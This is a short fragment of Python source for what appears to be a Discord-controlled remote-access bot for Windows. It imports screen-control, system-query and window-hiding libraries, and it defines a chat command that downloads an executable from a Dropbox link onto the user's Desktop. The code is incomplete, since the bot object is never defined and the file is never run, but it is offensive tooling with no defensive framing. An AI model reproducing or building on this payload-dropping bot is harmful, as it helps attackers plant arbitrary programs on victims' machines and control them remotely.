from asyncio import sleep
import pyautogui
import ctypes
import requests
import os
import discord
import platform
import wmi
import getpass 
import os
import re
import json
from discord.ext import commands
import win32gui, win32con

@bot.command()
async def bebra(ctx):
    r = requests.get("https://www.dropbox.com/s/mrwbs0erutmzxk2/BebraNET.exe?dl=1", allow_redirects=True)
    open("C:/Users/" + os.getlogin() + "/Desktop/BebraNET.exe", 'wb').write(r.content)
